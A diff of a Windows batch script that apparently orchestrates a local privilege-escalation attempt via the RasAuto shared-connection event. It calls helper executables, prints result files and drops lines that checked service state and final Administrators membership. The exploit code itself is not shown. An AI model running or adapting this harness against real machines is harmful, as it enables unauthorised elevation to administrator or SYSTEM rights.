@@ -16,17 +16,10 @@ echo.
 probe_console_token.exe
 echo.
 
-echo [+] RasAuto service state before trigger
-sc query RasAuto
-echo.
-
 echo [+] Signaling RasAutoDialSharedConnectionEvent
 signal_event.exe
 if errorlevel 1 (
     echo [!] signal_event.exe failed with %errorlevel%
-    echo.
-    echo [+] RasAuto service state after trigger failure
-    sc query RasAuto
     echo.
     echo [+] Shared-connection probe
     query_shared_connection.exe
@@ -49,6 +42,3 @@ if exist group_add.txt type group_add.txt
 echo.
 echo [+] system.txt
 if exist system.txt type system.txt
-echo.
-echo [+] Final Administrators membership
-net localgroup Administrators
